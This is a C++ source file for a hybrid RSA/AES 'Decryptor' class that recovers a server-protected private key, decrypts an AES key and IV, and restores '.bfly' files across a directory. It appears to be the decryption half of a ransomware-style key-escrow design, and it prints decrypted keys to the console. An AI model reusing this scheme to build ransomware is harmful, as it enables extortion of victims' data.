
#include <memory>

#include "crypto/decryptor.h"

namespace butterfly
{

namespace hybrid
{

Decryptor::Decryptor(const std::string &aesKeyDbFilepath) : _aesKeyDbFilepath(aesKeyDbFilepath), _decCPrivateRSAInitialized(false), _aesDecryptor(new aes::AESDecryptor())
{
    LOG_TRACE("Create class Decryptor");
}

void Decryptor::removeBFLYEnding(std::string &filepath)
{
    if (filepath.find(butterfly::ENC_BFLY_FILE_ENDING) != std::string::npos)
    {
        filepath.erase(filepath.length() - butterfly::ENC_BFLY_FILE_ENDING.length());
    }
}

void Decryptor::removeDecryptedFiles()
{

    butterfly::removeFile(butterfly::ENC_CPRIVATERSA_FILENAME);
    butterfly::removeFile(butterfly::ENC_AESKEY_FILENAME);
    butterfly::removeFile(butterfly::ENC_AESIV_FILENAME);
    butterfly::removeFile(butterfly::RSA_EKIV_FILENAME);

}

void Decryptor::invokeDir(const std::string &path)
{

    if ( !_decCPrivateRSAInitialized )
    {
        throw DecryptorException("CPrivateRSA string is not initialized!");
    }
    std::string aesk, aesiv;
    decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, butterfly::ENC_AESIV_FILENAME, aesk, aesiv);

    LOG_TRACE("Length of AESKEY in decrypt: " << aesk.length() << " and length of AESIV in decrypt: " << aesiv.length());

    auto files = DirectoryIterator::getAllFiles(path);
    for (auto &file: files)
    {
        LOG_TRACE("FILE: " << file);
        std::string filepath = file.string();
        removeBFLYEnding(filepath);
        decryptFileWithAES(filepath, aesk, aesiv);
    }

    removeDecryptedFiles();
}

std::string Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile)
{

    _rsaDecryptorCPrivateRSA = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(pkeyFromServer));

    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->getBinKeyFileContents(encCPrivateRSAFile);
    EVP_PKEY *CPrivateRSAPKey = _rsaDecryptorCPrivateRSA->getEvpPkey();

    try
    {
        _rsaDecryptorCPrivateRSA->decryptEVP(CPrivateRSAPKey, encCPrivateRSA, _decryptedCPrivateRSA, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
        LOG_TRACE("Decrypted CPrivateRSA: " << _decryptedCPrivateRSA);
        std::cout << "Decrypted CPrivateRSA: " << _decryptedCPrivateRSA << std::endl;
        _decCPrivateRSAInitialized = true;

    } catch (RSADecryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

    // Check if string is empty
    if ( _decryptedCPrivateRSA.empty() )
    {
        throw DecryptorException("Decrypted CPrivateRSA String is empty!");
    }

    return _decryptedCPrivateRSA;
}

void Decryptor::decryptAESKeyPair(const std::string &filepathAESKey, const std::string &filepathAESIV, std::string &decAESKey,  std::string &decAESIV)
{

    _rsaDecryptorAESKey = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));
    std::unique_ptr<rsa::RSADecryptor> _rsaDecryptorAESIV = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));

    EVP_PKEY *aesKeyPKey = _rsaDecryptorAESKey->getEvpPkey();

    std::string encAESKey = _rsaDecryptorAESKey->getBinKeyFileContents(filepathAESKey); // Length of encAESKey = 256
    std::string encAESIV= _rsaDecryptorAESIV->getBinKeyFileContents(filepathAESIV);    // Length of encAESIV = 256

    try
    {
        _rsaDecryptorAESKey->decryptEVP(aesKeyPKey, encAESKey, decAESKey, butterfly::RSAKEY_TYPE::AESKEY);
        LOG_TRACE("Decrypted Content from file " << filepathAESKey << ": " << decAESKey);
        std::cout << "Decrypted Content from file " << filepathAESKey << ": " << decAESKey << std::endl;

        _rsaDecryptorAESIV->decryptEVP(_rsaDecryptorAESIV->getEvpPkey(), encAESIV, decAESIV, butterfly::RSAKEY_TYPE::AESIV);
        LOG_TRACE("Decrypted Content from file " << filepathAESIV << ": " << decAESIV);
        std::cout << "Decrypted Content from file " << filepathAESIV << ": " << decAESIV << std::endl;

    } catch (RSADecryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

    // Check if string is empty
    if ( decAESKey.empty() )
    {
        throw DecryptorException("Decrypted " + filepathAESKey + " is empty!");
    }
    // Check if string is empty
    if ( decAESIV.empty() )
    {
        throw DecryptorException("Decrypted " + filepathAESIV + " is empty!");
    }

}

void Decryptor::decryptFileWithAES(const std::string &filepath, const std::string &aeskey, const std::string &aesiv)
{
    // Set AESKey and AESIV
    _aesDecryptor->setAESKey(aeskey);
    _aesDecryptor->setAESIv(aesiv);

    try
    {
        // Decrypt the file with AES
        _aesDecryptor->decryptFile(filepath);

    } catch (AESDecryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

}

} // namespace hybrid

} // namespace butterfly
